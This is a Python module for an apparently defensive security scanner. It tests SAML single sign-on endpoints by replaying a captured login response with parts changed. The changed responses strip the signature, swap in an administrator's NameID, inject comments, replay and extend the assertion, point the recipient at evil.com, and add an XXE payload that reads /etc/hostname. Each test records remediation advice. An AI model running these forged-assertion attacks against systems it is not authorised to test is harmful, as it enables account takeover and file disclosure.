"""
SAML SSO vulnerability scanner.

Tests SAML implementations for:
- Signature exclusion (unsigned assertion acceptance)
- Signature wrapping (XSW attacks)
- NameID manipulation
- Comment injection in NameID
- Assertion replay
- XXE via SAML XML
- Recipient/audience validation bypass
- Condition manipulation (NotOnOrAfter bypass)

Requires a captured SAMLResponse from a valid authentication flow.
The auth module (NTLMv2 + SAML) captures this automatically during
the login phase.
"""

import base64
import re
import copy
import httpx
from typing import Optional
from xml.etree import ElementTree as ET

from mantis.core.findings import (
    Finding, Severity, EvidenceLevel, FindingSource, HTTPEvidence,
)

# XML namespaces used in SAML
NAMESPACES = {
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
    "xenc": "http://www.w3.org/2001/04/xmlenc#",
}

# Register all namespaces so ET preserves them
for prefix, uri in NAMESPACES.items():
    ET.register_namespace(prefix, uri)


class SAMLScanner:
    """
    Tests SAML SSO implementations for common vulnerabilities.

    Usage:
        scanner = SAMLScanner(http_client)
        findings = await scanner.scan(
            acs_url="https://app.example.com/saml/acs",
            saml_response_b64="PHNhbWxwOl...",  # captured during auth
            relay_state="https://app.example.com/dashboard",
        )
    """

    def __init__(self, http: httpx.AsyncClient):
        self.http = http

    async def scan(
        self,
        acs_url: str,
        saml_response_b64: str,
        relay_state: str = "",
        target_user: str = "admin@company.com",
    ) -> list[Finding]:
        """Run all SAML vulnerability tests."""
        if not saml_response_b64 or not acs_url:
            return []

        findings = []

        # Decode the original assertion for manipulation
        try:
            saml_xml = base64.b64decode(saml_response_b64).decode(errors="replace")
        except Exception:
            return []

        # Run each test
        tests = [
            ("Signature Exclusion", self._test_signature_exclusion),
            ("NameID Manipulation", self._test_nameid_manipulation),
            ("Comment Injection", self._test_comment_injection),
            ("Assertion Replay", self._test_assertion_replay),
            ("XXE Injection", self._test_xxe),
            ("Condition Manipulation", self._test_condition_manipulation),
            ("Recipient Validation", self._test_recipient_validation),
        ]

        for test_name, test_func in tests:
            try:
                finding = await test_func(
                    acs_url, saml_xml, relay_state, target_user,
                )
                if finding:
                    findings.append(finding)
            except Exception as e:
                pass  # Individual test failure shouldn't stop others

        return findings

    async def _submit_saml(
        self, acs_url: str, saml_xml: str, relay_state: str
    ) -> httpx.Response:
        """Submit a SAML response to the ACS endpoint."""
        saml_b64 = base64.b64encode(saml_xml.encode()).decode()
        data = {"SAMLResponse": saml_b64}
        if relay_state:
            data["RelayState"] = relay_state

        return await self.http.post(
            acs_url,
            data=data,
            follow_redirects=True,
            timeout=15,
        )

    def _is_authenticated(self, resp: httpx.Response) -> bool:
        """Check if the response indicates successful authentication."""
        # Successful auth typically results in redirect (302) to app
        # or 200 with session cookies
        if resp.status_code in (200, 302, 303):
            if resp.cookies:
                return True
            # Check for session cookie in redirect chain
            if hasattr(resp, 'history'):
                for r in resp.history:
                    if r.cookies:
                        return True
        return False

    async def _test_signature_exclusion(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 1: Remove the signature entirely.

        If the SP accepts an unsigned assertion, any attacker can
        forge assertions for any user.
        """
        # Remove all Signature elements
        modified = re.sub(
            r'<ds:Signature[^>]*>.*?</ds:Signature>',
            '', saml_xml, flags=re.DOTALL
        )
        # Also try without namespace prefix
        modified = re.sub(
            r'<Signature[^>]*xmlns[^>]*>.*?</Signature>',
            '', modified, flags=re.DOTALL
        )

        if modified == saml_xml:
            return None  # No signature found to remove

        resp = await self._submit_saml(acs_url, modified, relay_state)

        if self._is_authenticated(resp):
            return Finding(
                title="SAML Signature Exclusion — unsigned assertion accepted",
                description=(
                    "The Service Provider accepts SAML assertions without "
                    "a cryptographic signature. An attacker can forge assertions "
                    "for any user by crafting unsigned SAML XML."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.CRITICAL,
                evidence_level=EvidenceLevel.EXPLOIT_DEMONSTRATED,
                target=acs_url,
                endpoint=acs_url,
                vuln_type="SAML Signature Exclusion",
                cwe="CWE-347",
                owasp_category="A07:2021 Identification and Authentication Failures",
                evidence=[HTTPEvidence(
                    request_method="POST",
                    request_url=acs_url,
                    request_headers={"Content-Type": "application/x-www-form-urlencoded"},
                    request_body="SAMLResponse=<base64 assertion with signature removed>",
                    response_status=resp.status_code,
                    response_headers=dict(resp.headers),
                    response_body=resp.text[:3000],
                    notes="Unsigned SAML assertion accepted — session created",
                )],
                reproduction_steps=[
                    "1. Capture a valid SAMLResponse during login",
                    "2. Base64-decode the SAMLResponse",
                    "3. Remove the entire <ds:Signature> XML block",
                    "4. Re-encode to base64",
                    "5. Submit to the ACS endpoint — session is created without valid signature",
                ],
                impact=(
                    "Complete authentication bypass. Any attacker can forge SAML "
                    "assertions and authenticate as any user, including administrators."
                ),
                remediation=(
                    "Enforce SAML signature validation. Reject all unsigned assertions. "
                    "Ensure the SP's SAML library is configured to require signatures "
                    "on both the Response and the Assertion elements."
                ),
                confidence=0.95,
                tags=["saml", "signature_exclusion", "critical_auth_bypass"],
            )
        return None

    async def _test_nameid_manipulation(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 2: Change the NameID to impersonate another user.

        Combined with signature exclusion — if signatures aren't
        validated, changing NameID achieves account takeover.
        """
        # Remove signature first (needed for manipulation)
        modified = re.sub(
            r'<ds:Signature[^>]*>.*?</ds:Signature>',
            '', saml_xml, flags=re.DOTALL
        )
        modified = re.sub(
            r'<Signature[^>]*xmlns[^>]*>.*?</Signature>',
            '', modified, flags=re.DOTALL
        )

        # Change NameID to target user
        modified = re.sub(
            r'(<(?:\w+:)?NameID[^>]*>)[^<]+(</(?:\w+:)?NameID>)',
            rf'\g<1>{target_user}\g<2>',
            modified,
        )

        if modified == saml_xml:
            return None

        resp = await self._submit_saml(acs_url, modified, relay_state)

        if self._is_authenticated(resp):
            return Finding(
                title=f"SAML NameID Manipulation — impersonation of {target_user}",
                description=(
                    f"The SP accepted a SAML assertion with a modified NameID "
                    f"({target_user}), allowing authentication as an arbitrary user."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.CRITICAL,
                evidence_level=EvidenceLevel.EXPLOIT_DEMONSTRATED,
                target=acs_url, endpoint=acs_url,
                vuln_type="SAML NameID Manipulation",
                cwe="CWE-290",
                impact=f"Account takeover — authenticated as {target_user}",
                remediation="Enforce signature validation on the Assertion element, not just the Response.",
                confidence=0.9,
                tags=["saml", "nameid_manipulation", "account_takeover"],
            )
        return None

    async def _test_comment_injection(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 3: Inject XML comment inside NameID.

        Some parsers strip comments before extracting the value,
        leading to identity mismatch between signature validation
        and authentication logic.
        """
        # Try comment injection: user@evil.com<!---->.admin@company.com
        # The signature validates the full text, but the app may
        # extract only the part before the comment
        modified = re.sub(
            r'(<(?:\w+:)?NameID[^>]*>)[^<]+(</(?:\w+:)?NameID>)',
            rf'\g<1>{target_user}<!--MANTIS_TEST-->\g<2>',
            saml_xml,
        )

        resp = await self._submit_saml(acs_url, modified, relay_state)

        if self._is_authenticated(resp):
            return Finding(
                title="SAML Comment Injection — identity spoofing via XML comment",
                description=(
                    "The SP's XML parser handles comments differently during "
                    "signature validation vs NameID extraction, allowing identity "
                    "spoofing by injecting comments into the NameID value."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=acs_url, endpoint=acs_url,
                vuln_type="SAML Comment Injection",
                cwe="CWE-290",
                impact="Identity spoofing via XML comment differential parsing",
                remediation="Use a SAML library that normalizes comments before both validation and extraction.",
                confidence=0.8,
                tags=["saml", "comment_injection"],
            )
        return None

    async def _test_assertion_replay(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 4: Replay a previously captured assertion.

        Submit the same SAMLResponse twice. If the SP doesn't track
        used assertion IDs, the second submission creates a new session.
        """
        # First submission (original, should work)
        resp1 = await self._submit_saml(acs_url, saml_xml, relay_state)

        # Second submission (replay, should fail if SP tracks assertions)
        resp2 = await self._submit_saml(acs_url, saml_xml, relay_state)

        if self._is_authenticated(resp2):
            return Finding(
                title="SAML Assertion Replay — no one-time-use enforcement",
                description=(
                    "The SP accepts replayed SAML assertions. An attacker who "
                    "captures a SAMLResponse can re-submit it indefinitely to "
                    "create new authenticated sessions."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=acs_url, endpoint=acs_url,
                vuln_type="SAML Assertion Replay",
                cwe="CWE-294",
                impact="Session hijacking via assertion replay",
                remediation=(
                    "Implement assertion ID tracking. Store used assertion IDs "
                    "and reject any assertion with a previously seen ID. Also "
                    "enforce NotOnOrAfter conditions."
                ),
                confidence=0.85,
                tags=["saml", "replay"],
            )
        return None

    async def _test_xxe(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 5: XXE injection via SAML XML.

        The SAMLResponse is XML — if the SP's parser allows external
        entities, XXE can be injected to read files or perform SSRF.
        """
        # Inject XXE at the beginning of the XML
        xxe_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/hostname">'
            ']>'
        )
        # Remove existing XML declaration
        modified = re.sub(r'<\?xml[^?]*\?>', '', saml_xml)
        modified = xxe_payload + modified

        # Reference entity in a visible field
        modified = re.sub(
            r'(<(?:\w+:)?NameID[^>]*>)[^<]+(</(?:\w+:)?NameID>)',
            r'\g<1>&xxe;\g<2>',
            modified,
        )

        resp = await self._submit_saml(acs_url, modified, relay_state)

        # Check if file content appears in response (unlikely but check)
        # More commonly, use OOB XXE — check via callback server
        body = resp.text.lower()
        xxe_indicators = [
            "root:", "/bin/bash", "localhost",  # /etc/hostname, /etc/passwd
            "xxe", "entity",  # Error messages revealing XXE processing
        ]
        if any(ind in body for ind in xxe_indicators):
            return Finding(
                title="XXE via SAML — XML external entity processed",
                description=(
                    "The SP's XML parser processes external entities in SAML "
                    "assertions, enabling file read, SSRF, or denial of service."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=acs_url, endpoint=acs_url,
                vuln_type="XXE via SAML",
                cwe="CWE-611",
                impact="File read, SSRF, or DoS via the SAML XML parser",
                remediation=(
                    "Disable external entity processing in the SP's XML parser. "
                    "Use defusedxml (Python), or configure the parser to disallow DTDs."
                ),
                confidence=0.85,
                tags=["saml", "xxe"],
            )
        return None

    async def _test_condition_manipulation(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 6: Modify NotOnOrAfter to extend assertion validity.
        """
        # Remove signature
        modified = re.sub(
            r'<ds:Signature[^>]*>.*?</ds:Signature>',
            '', saml_xml, flags=re.DOTALL
        )
        # Extend expiry to 2030
        modified = re.sub(
            r'NotOnOrAfter="[^"]*"',
            'NotOnOrAfter="2030-12-31T23:59:59Z"',
            modified,
        )

        resp = await self._submit_saml(acs_url, modified, relay_state)

        if self._is_authenticated(resp):
            return Finding(
                title="SAML Condition Bypass — extended assertion validity accepted",
                description=(
                    "The SP accepted a SAML assertion with a manipulated "
                    "NotOnOrAfter condition (extended to 2030). This means "
                    "captured assertions can be replayed long after they should expire."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=acs_url, endpoint=acs_url,
                vuln_type="SAML Condition Manipulation",
                cwe="CWE-613",
                impact="Assertion replay window extended indefinitely",
                remediation="Validate NotOnOrAfter against the SP's own clock independently of the assertion signature.",
                confidence=0.75,
                tags=["saml", "condition_bypass"],
            )
        return None

    async def _test_recipient_validation(
        self, acs_url: str, saml_xml: str, relay_state: str, target_user: str
    ) -> Optional[Finding]:
        """
        Test 7: Check if Recipient/Destination are validated.
        """
        # Modify the Recipient/Destination to a different URL
        modified = re.sub(
            r'Recipient="[^"]*"',
            'Recipient="https://evil.com/acs"',
            saml_xml,
        )
        modified = re.sub(
            r'Destination="[^"]*"',
            'Destination="https://evil.com/acs"',
            modified,
        )

        # Still submit to the real ACS — if SP doesn't check
        # Recipient == actual URL, it's vulnerable
        resp = await self._submit_saml(acs_url, modified, relay_state)

        if self._is_authenticated(resp):
            return Finding(
                title="SAML Recipient Validation Missing",
                description=(
                    "The SP accepted a SAML assertion with a Recipient/Destination "
                    "pointing to a different URL. Assertions from other SPs could "
                    "be reused against this application."
                ),
                source=FindingSource.WEBAPP,
                severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=acs_url, endpoint=acs_url,
                vuln_type="SAML Recipient Confusion",
                cwe="CWE-287",
                impact="Cross-SP assertion reuse — authenticate using assertions meant for other applications",
                remediation="Validate that the Recipient URL in the assertion matches the SP's actual ACS URL.",
                confidence=0.8,
                tags=["saml", "recipient_confusion"],
            )
        return None
